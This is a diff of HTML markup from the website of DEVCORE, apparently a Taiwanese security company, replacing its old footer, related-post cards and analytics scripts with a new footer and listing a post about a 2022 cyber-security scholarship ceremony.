+                    <div class="content">
+                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/公告/">#公告</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement/">DEVCORE 2022 年度全國資訊安全獎學金頒獎餐敘順利落幕</a> 
+                        </h2>
+                    
+                    
+                        <span class="date">2022-12-23</span>
+                        <p class="line-litmit-3">全國資訊安全獎學金頒獎餐敘順利落幕，期待獲獎同學們未來持續深耕資安知識與技術，在資安舞台上發光發熱！
+                        </p>
+                    </div>
+                </article>
+              
 
-
-
-
-
-</main>
-      <div class="container--wrapper">
-
-        <div class="relative-posts">
-          <div class="heading--side-lined container">
-            最新消息
-          </div>
-          <div class="relative-posts__cells">
-  
-            <section class="card">
-              <a href="/blog/2023/01/14/3rd-internship-program-recruit/">
-                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20230114/cover.jpg)"></div>
-                <h3 class="card__title">
-                  DEVCORE 2023 第三屆實習生計畫
-                </h3></a>
-              <div class="card__tags">
-  
-                <a href="/blog/tag/公告/" class="card__tag">公告</a><a href="/blog/tag/徵才/" class="card__tag">徵才</a>
-              </div>
-              <small class="card__category"><a href="/blog/category/最新消息/">最新消息</a></small>
-            </section>
-  
-            <section class="card">
-              <a href="/blog/2023/01/12/DEVCORE-conference-registration-open-now/">
-                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20230112/cover.jpg)"></div>
-                <h3 class="card__title">
-                  DEVCORE Conference 2023 即日起開放報名
-                </h3></a>
-              <div class="card__tags">
-  
-                <a href="/blog/tag/公告/" class="card__tag">公告</a>
-              </div>
-              <small class="card__category"><a href="/blog/category/最新消息/">最新消息</a></small>
-            </section>
-  
-            <section class="card">
-              <a href="/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement/">
-                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20221223/cover.jpg)"></div>
-                <h3 class="card__title">
-                  DEVCORE 2022 年度全國資訊安全獎學金頒獎餐敘順利落幕
-                </h3></a>
-              <div class="card__tags">
-  
-                <a href="/blog/tag/公告/" class="card__tag">公告</a>
-              </div>
-              <small class="card__category"><a href="/blog/category/最新消息/">最新消息</a></small>
-            </section>
-  
-          </div>
-        </div>
-
-
-        <div class="contact-section container">
-          <h2 class="contact-section__title">
-            用最真實的攻擊，驗證企業的防禦
-          </h2>
-          <a href="/contact/" class="home-contact__button button--dense">聯絡我們</a>
-        </div>
-
-        <footer class="main-footer">
-          <div class="main-footer__about">
-            戴夫寇爾提供<br class="mobile-only" /><a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務<br />在<a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a>或<a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>上追蹤我們的<a href="/blog/" class="link">最新訊息</a><br />瞭解更多戴夫寇爾的<a href="/about/" class="link">駭客思維</a>
-          </div>
-          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
-                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
-                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
-          </div>
-          <address class="main-footer__address">
-            <ul class="list--unstyled">
-              <li>
-                地址 105608 台北市松山區八德路三段 32 號 13 樓
-              </li>
-              <li>
-                Email contact@devco.re
-              </li>
-              <li>
-                電話 02-2577-0925
-              </li>
-              <li>
-                傳真 02-2577-0928
-              </li>
-              <li>
-                統編 53955237
-              </li>
-            </ul>
-          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2023 DEVCORE 戴夫寇爾</small>
-        </footer>
-      </div>
+            </div>
+        </section>
     </div>
-    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>
 
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">服務</h6>
+        <ul>
+            <li><a href="/services/red-team/">紅隊演練</a></li>
+            <li><a href="/services/penetration-test/">滲透測試</a></li>
+            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
+            <li><a href="/services/security-training/">資安教育訓練</a></li>
+        </ul>
+    </div>
 
-  <script type="text/javascript">
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-30830800-1']);
-  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+    <div class="column">
+        <h6 class="mobile_toggle">研究</h6>
+        <ul>
+            <li><a href="/research/overview/">總覽概要</a></li>
+            <li><a href="/research/awards/">競賽與獎項</a></li>
+            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
+            <li><a href="/research/talks/">國際研討會</a></li>
+            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
+        </ul>
+    </div>
 
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-  })();
-</script>
+    <div class="column">
+        <h6 class="mobile_toggle">公司</h6>
+        <ul>
+            <li><a href="/company/about/">公司簡介</a></li>
+            <li><a href="/company/our-team/">團隊成員</a></li>
+            <li><a href="/company/history/">成就與沿革</a></li>
+            <li><a href="/company/csr/">企業社會責任</a></li>
+            <li><a href="/company/jobs/">工作機會</a></li>
+            <li><a href="/contact/">聯絡我們</a></li>
+        </ul>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">新聞</h6>
+        <ul>
+            <li><a href="/blog/">所有文章</a></li>
+            <li><a href="/blog/category/最新消息/">最新消息</a></li>
+            <li><a href="/blog/category/技術專欄/">技術專欄</a></li>
+            <li><a href="/blog/category/科普文章/">科普文章</a></li>
+            <li><a href="/blog/category/資安新聞/">資安新聞</a></li>
+            <li><a href="/media-kit/">媒體素材下載</a></li>
+        </ul>
+    </div>
 
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
 
+    <div class="copyright">
+        <div class="info">
+            <span>© 2023 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All right reserved.</b></span>
+            <span><a href="/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
 
-    <!-- Google Tag Manager (noscript) -->
-    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
-    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
-
-  </body>
+</div>
+    </footer>
+</body>
 </html>
-
-
-
 
